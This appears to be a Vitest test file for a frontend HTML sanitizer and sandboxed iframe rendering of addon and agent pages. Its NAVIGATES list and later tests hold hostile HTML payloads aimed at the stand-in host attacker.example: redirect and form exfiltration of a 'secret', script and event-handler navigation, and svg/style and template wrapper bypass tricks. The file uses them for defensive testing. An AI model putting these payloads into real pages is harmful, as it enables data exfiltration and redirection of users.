// Security review #1: addon and agent HTML is drawn inert (no scripts) after core's sanitizer took out everything that
// could navigate the frame or load something; only core's own pinned widget templates run scripts.
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { inertDocument, sanitizeFrameHtml } from './frameSanitize'
import { FrameNode } from './FrameNode'
import { AddonNode } from './AddonNode'

const NAVIGATES = [
  '<meta http-equiv="refresh" content="0;url=https://attacker.example/?d=secret">',
  '<base href="https://attacker.example/">',
  '<a href="https://attacker.example/?d=secret" target="_top">x</a>',
  '<a href="javascript:alert(1)">x</a>',
  '<form action="https://attacker.example/"><input name="d" value="secret"><button>go</button></form>',
  '<button formaction="https://attacker.example/">go</button>',
  '<iframe src="https://attacker.example/"></iframe>',
  '<object data="https://attacker.example/x"></object>',
  '<embed src="https://attacker.example/x">',
  '<link rel="prefetch" href="https://attacker.example/">',
  '<img src="https://attacker.example/x.png" srcset="https://attacker.example/y.png 2x">',
  '<svg><a href="https://attacker.example/"><text>x</text></a><image href="https://attacker.example/i.png"/><set attributeName="href" to="https://attacker.example/"/></svg>',
  '<area href="https://attacker.example/">',
  '<a ping="https://attacker.example/">x</a>',
  '<script>location.href="https://attacker.example/"</script>',
  '<div onclick="location=\'https://attacker.example/\'">x</div>',
  '<template><meta http-equiv="refresh" content="0;url=https://attacker.example/"></template>',
  '<noscript><meta http-equiv="refresh" content="0;url=https://attacker.example/"></noscript>',
  '<svg><style><img src=x onerror="location=\'https://attacker.example/\'"></style></svg>',
]

describe('sanitizeFrameHtml', () => {
  it.each(NAVIGATES)('takes out what could navigate or load: %s', (html) => {
    const out = sanitizeFrameHtml(html)
    expect(out).not.toMatch(/attacker\.example/)
    expect(out).not.toMatch(/<(meta|base|script|iframe|object|embed|link|form|template)\b/i)
    expect(out).not.toMatch(/\s(on\w+|target|formaction|ping|srcset)=/i)
    expect(out).not.toMatch(/javascript:/i)
  })
  it('keeps what a static page needs: markup, styles, inline data images, in-page anchors, details', () => {
    const html = '<style>p{color:red}</style><h4>Title</h4><p style="margin:0">Text</p><img src="data:image/png;base64,AAAA" alt="a"><a href="#x">jump</a><details><summary>more</summary>hidden</details><table><tr><td>1</td></tr></table>'
    const out = sanitizeFrameHtml(html)
    for (const s of ['<style>p{color:red}</style>', '<h4>Title</h4>', 'style="margin:0"', 'src="data:image/png;base64,AAAA"', 'href="#x"', '<details>', '<td>1</td>']) expect(out).toContain(s)
  })
  it('a form keeps its fields but is no form any more', () => {
    const out = sanitizeFrameHtml('<form action="https://attacker.example/"><label>Name <input name="n"></label></form>')
    expect(out).toContain('<input name="n">')
    expect(out).not.toContain('<form')
  })
  it('the inert document starts with core\'s CSP and has no script anywhere', () => {
    const doc = inertDocument('<p>x</p><script>1</script>')
    expect(doc.startsWith('<!doctype html><html><head><meta http-equiv="Content-Security-Policy"')).toBe(true)
    expect(doc).toContain("default-src 'none'")
    expect(doc).not.toContain('script-src')
    expect(doc).not.toMatch(/<script/i)
  })
})

describe('frames', () => {
  const qc = () => new QueryClient()
  it('an addon frame node renders without allow-scripts and with the sanitized document', () => {
    render(
      <QueryClientProvider client={qc()}>
        <AddonNode addon="publish" node={{ type: 'frame', title: 'Addon page', html: '<meta http-equiv="refresh" content="0;url=https://attacker.example/"><p>hello</p><script>parent.x=1</script>', height: 200 }} />
      </QueryClientProvider>,
    )
    const f = screen.getByTitle('Addon page')
    expect(f.getAttribute('sandbox')).toBe('')
    expect(f.getAttribute('sandbox')).not.toContain('allow-scripts')
    const doc = f.getAttribute('srcdoc')!
    expect(doc).toContain('<p>hello</p>')
    expect(doc).not.toMatch(/refresh|<script|attacker/)
  })
  it('agent HTML (inert mode) has no allow-scripts and a fixed height the person can resize', () => {
    render(<FrameNode node={{ type: 'frame', title: 'Agent page', html: '<p>x</p>', height: 300 }} fallback={null} />)
    const f = screen.getByTitle('Agent page')
    expect(f.getAttribute('sandbox')).toBe('')
    expect(f.closest('[data-frame-resize]')).toHaveStyle({ height: '300px' })
  })
  it('only core\'s own template document runs scripts', () => {
    render(<FrameNode node={{ type: 'frame', title: 'Template', html: '<p>x</p><script>1</script>', height: 200 }} fallback={null} coreTemplate fitContent />)
    expect(screen.getByTitle('Template').getAttribute('sandbox')).toBe('allow-scripts')
  })
})
